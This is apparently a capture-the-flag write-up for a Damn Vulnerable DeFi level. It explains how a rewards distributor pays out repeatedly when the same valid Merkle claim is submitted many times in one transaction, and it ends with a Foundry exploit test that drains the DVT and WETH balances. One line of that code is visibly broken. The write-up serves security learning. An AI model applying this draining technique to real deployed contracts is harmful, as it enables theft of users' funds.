# Statement

<img width="785" height="394" alt="image" src="https://github.com/user-attachments/assets/3124d414-9f05-4e25-a8dd-2275a2014c40" />

## How the contract works simply:

<img width="476" height="266" alt="image" src="https://github.com/user-attachments/assets/ee0e8105-9ddb-417f-bc5e-08798a46e689" />

## 1. Background Story

In this level we have a rewards distributor contract, `TheRewarderDistributor`, which is supposed to:

- Hold two tokens:
  - **DVT** (Damn Valuable Token)
  - **WETH**
- Use a **Merkle tree** to prove who deserves how much
- Use a **bitmap** to remember **which batches** each user has already claimed from
- Let users claim **multiple rewards in a single transaction** for gas efficiency

Our goal as the attacker (the `player`):

> Drain almost all **DVT** and **WETH** from the distributor and send them to a `recovery` address,  
> while respecting the rules of the test harness.

Alice already claimed her portion once. We’re now coming later and abusing a logic bug to claim way more than we should.

<br><br><br><br>

## 2. How the Distributor Is Supposed to Work

Conceptually, the distributor works like this:

1. The project team creates a **Merkle tree** of rewards:
   - Off-chain, they decide:  
     “Alice gets X, Bob gets Y, Player gets Z, …”
   - They hash `(address, amount)` pairs into Merkle leaves.
   - They publish only the **root** on-chain.

2. On-chain, for each token (DVT / WETH), they store:
   - A Merkle **root** for that distribution
   - A `remaining` counter: how many tokens are left to be claimed
   - A **bitmap** that tracks, for each user:
     - Which **distribution batch** they have already claimed from

3. When you claim:
   - You provide:
     - Your address (implicitly `msg.sender`)
     - Your `amount`
     - The **Merkle proof**
     - The `batchNumber` that this claim belongs to
   - The contract:
     - Checks that your proof is valid (you’re in the tree with that `amount`)
     - Checks that you **haven’t already claimed** this batch (using the bitmap)
     - Marks this batch as **claimed**
     - Transfers the tokens to you
       
<br><br><br><br>


## 3. Where Things Go Wrong

The core of the bug is **not cryptographic**.  
We don’t fake Merkle proofs; we don’t break `keccak256`.

The problem is **how the contract handles multiple claims in one transaction**.

The idea in the code is:

- For each token:
  - Take all claims in the input array that refer to that token.
  - Sum up the `amount` of all those claims.
  - Build a “bitmask” of which batches are being claimed.
  - At the end, call a helper function once to:
    - Mark all those batches as claimed in the bitmap.
    - Decrease the `remaining` counter by the **total** `amount`.

At the same time, for **each individual claim** inside the loop, the contract:

- Verifies the Merkle proof
- Transfers `amount` tokens to the user

So the flow is:

> **Per claim:**  
> verify proof → transfer tokens

> **Per token group (once):**  
> mark “these batches are now claimed” → subtract the total claimed amount

The key issue:

- Nothing stops us from putting **the exact same valid claim** into the array **many times** in a single call.
- As long as the Merkle proof is valid, each individual claim:
  - Passes the proof check
  - Transfers tokens to us

But when it’s time to “remember” what we claimed:

- The bitmap only records  
  “this batch has been claimed” **once** at the end.
- The contract does **not** realize that, in this one transaction, we used the **same batch multiple times**.

So we can:

> Copy-paste our own legitimate claim many times into one transaction,  
> and get paid **multiple times** for the same Merkle entry.

The contract thinks:

> “Well, batch 0 wasn’t claimed before, so I’ll allow this big combined claim and mark batch 0 as claimed now.”

It has **no idea** that the single call actually contained many duplicate claims.

---

<br><br><br><br>

## 4. Exploit Idea in One Paragraph

We know the challenge JSON has a reward entry for `player` for both:

- The **DVT** distribution
- The **WETH** distribution

We:

1. Parse both distribution files.
2. Find the index where `beneficiary == player` and get:
   - Our **legit amount** in each distribution.
   - Our **Merkle proof** in each distribution.
3. Compute how many times we can repeat each claim so that:
   - Repeated DVT claims ≈ whole DVT distribution.
   - Repeated WETH claims ≈ whole WETH distribution.
4. Build a big `Claim[]` where we:
   - Repeat the same valid DVT claim for `batch 0` many times.
   - Then repeat the same valid WETH claim for `batch 0` many times.
5. Call `claimRewards` once with this big array.
6. The contract happily:
   - Verifies each claim.
   - Pays us over and over.
   - Only at the end, marks “batch 0” as claimed once per token.
7. Finally, we transfer everything from `player` to the `recovery` address.

<img width="512" height="305" alt="image" src="https://github.com/user-attachments/assets/2794f777-084d-4cf8-8f64-b87dbb8e750f" />


---

<br><br><br><br>

## 5. Attack Code

Here is the test solution that performs the exploit:

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // 1. Load distributions from JSON
    string memory dvtJson  = vm.readFile("test/the-rewarder/dvt-distribution.json");
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));

    string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
    Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));

    bytes32[] memory dvtLeaves  = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    // 2. Find player's DVT & WETH amounts + proofs
    uint256 playerDvtAmount;
    bytes32[] memory playerDvtProof;
    uint256 playerWethAmount;
    bytes32[] memory playerWethProof;

    for (uint i = 0; i < dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            playerDvtAmount  = dvtRewards[i].amount;
            playerWethAmount = wethRewards[i].amount;
            playerDvtProof   = merkle.getProof(dvtLeaves, i);
            playerWethProof  = merkle.getProof(wethLeaves, i);
            break;
        }
    }

    require(playerDvtAmount > 0, "Player not found in DVT distribution");
    require(playerWethAmount > 0, "Player not found in WETH distribution");

    // 3. Tokens array
    IERC20;
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // 4. Calculate how many repeated claims fit into each distribution
    uint256 dvtClaims  = TOTAL_DVT_DISTRIBUTION_AMOUNT  / playerDvtAmount;
    uint256 wethClaims = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount;
    uint256 totalClaimsNeeded = dvtClaims + wethClaims;

    // 5. Build repeated claims array:
    //    - first dvtClaims entries: same DVT claim for batch 0
    //    - then wethClaims entries: same WETH claim for batch 0
    Claim[] memory claims = new Claim[](totalClaimsNeeded);

    for (uint256 i = 0; i < totalClaimsNeeded; i++) {
        claims[i] = Claim({
            batchNumber: 0,                                      // always batch 0
            amount:     i < dvtClaims ? playerDvtAmount          : playerWethAmount,
            tokenIndex: i < dvtClaims ? 0                        : 1,      // 0 = DVT, 1 = WETH
            proof:      i < dvtClaims ? playerDvtProof           : playerWethProof
        });
    }

    // 6. Exploit: multiple identical claims for batch 0 in one call
    distributor.claimRewards({
        inputClaims: claims,
        inputTokens: tokensToClaim
    });

    // 7. Send everything we drained to the recovery address
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
